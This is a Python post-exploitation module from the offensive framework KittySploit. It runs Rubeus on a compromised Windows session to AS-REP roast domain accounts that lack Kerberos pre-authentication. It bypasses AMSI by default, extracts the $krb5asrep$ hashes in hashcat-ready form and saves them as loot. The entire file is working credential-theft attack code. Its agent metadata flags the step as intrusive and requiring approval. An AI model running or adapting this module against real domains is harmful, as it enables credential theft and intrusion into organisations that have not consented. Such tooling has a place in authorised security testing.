#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""AS-REP roast via Rubeus loadmodule — accounts without Kerberos pre-auth."""

from kittysploit import *

from lib.post.windows.hash_loot import save_hash_loot
from lib.post.windows.loadmodule_helper import run_catalog_assembly
from lib.post.windows.rubeus_hashes import extract_kerberos_hashes
from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows AS-REP Roast (optional Rubeus)",
        "description": (
            "OPTIONAL fallback: requires Rubeus.exe for live $krb5asrep$ hashes. "
            "Prefer native post/ldap/gather/asrep_roast."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL, SessionType.POLLING],
        "references": [
            "https://attack.mitre.org/techniques/T1558/004/",
            "https://github.com/GhostPack/Rubeus",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials"],
            "cost": 1.7,
            "noise": 0.65,
            "value": 0.8,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {
                "consumes_capabilities": ["shell", "asrep_targets"],
                "produces_capabilities": ["kerberos_hashes"],
            },
        },
    }

    arguments = OptString(
        "asreproast /outfile:C:\\Windows\\Temp\\ks_asrep.txt",
        "Rubeus arguments",
        False,
    )
    bypass_amsi = OptBool(True, "AMSI bypass before loadmodule", False)
    save_loot = OptBool(True, "Write hashcat lines to output/loot/", False)
    assembly = OptString("Rubeus", "Catalog name or path for Rubeus.exe", False)

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        args = str(self.arguments or "").strip()
        print_status(f"loadmodule {self.assembly} — {args}")
        try:
            out = run_catalog_assembly(
                self,
                str(self.assembly or "Rubeus"),
                arguments=args,
                bypass_amsi=bool(self.bypass_amsi),
            )
        except FileNotFoundError as exc:
            raise ProcedureError(
                FailureType.NotFound,
                f"{exc}. Drop Rubeus.exe into data/assemblies/ "
                "(see data/assemblies/README.md).",
            ) from exc
        except Exception as exc:
            raise ProcedureError(FailureType.Unknown, f"Rubeus execution failed: {exc}") from exc

        if out:
            print_info(out)

        hashes = extract_kerberos_hashes(out or "")
        asrep = [h for h in hashes if h["kind"] == "krb5asrep"]
        if not asrep:
            print_warning("No $krb5asrep$ lines parsed. Domain may have no vulnerable users.")
            return True

        print_success(f"Extracted {len(asrep)} AS-REP hash(es) (hashcat -m 18200)")
        for item in asrep:
            user = item.get("username") or "?"
            print_info(f"  [{user}] {item['hash'][:80]}...")

        if self.save_loot:
            path = save_hash_loot(
                asrep,
                kind="asreproast",
                session_id=str(getattr(self, "session_id", "") or ""),
            )
            if path:
                print_success(f"Loot saved: {path}")
        return True
